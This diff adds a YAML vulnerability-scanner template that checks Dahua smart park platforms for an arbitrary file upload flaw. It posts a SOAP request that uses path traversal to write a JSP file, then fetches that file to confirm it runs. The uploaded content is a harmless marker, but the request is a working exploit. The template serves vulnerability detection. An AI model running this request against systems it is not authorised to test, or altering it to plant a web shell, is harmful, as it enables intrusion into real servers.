@@ -1,0 +1,40 @@
+id: dahua-bitmap-fileupload
+
+info:
+  name: 大华智慧园区综合管理平台bitmap接口存在任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  reference:
+    - https://mp.weixin.qq.com/s/Ll1mcBbqZS5TXK_1GnXZBw
+  tags: dahua,fileupload
+  created: 2024/02/02
+
+set:
+  randstr: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /emap/webservice/gis/soap/bitmap
+      headers:
+        Content-Type: text/xml; charset=utf-8
+      body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
+            <soapenv:Header/>           
+                <soapenv:Body>
+                        <res:uploadPicFile>
+                            <arg0>
+                            <picPath>/../{{randstr}}.jsp</picPath>
+                            </arg0>
+                            <arg1>PCUgb3V0LnByaW50bG4oImF0ZmVyc290ZyIpOyAlPg==</arg1>
+                        </res:uploadPicFile>
+                </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.status == 200 && response.body.bcontains(b'<soap:Envelope')
+  r1:
+    request:
+      method: GET
+      path: /upload/{{randstr}}.jsp
+    expression: response.status == 200 && response.body.bcontains(b'atfersotg')
+expression: r0() && r1()
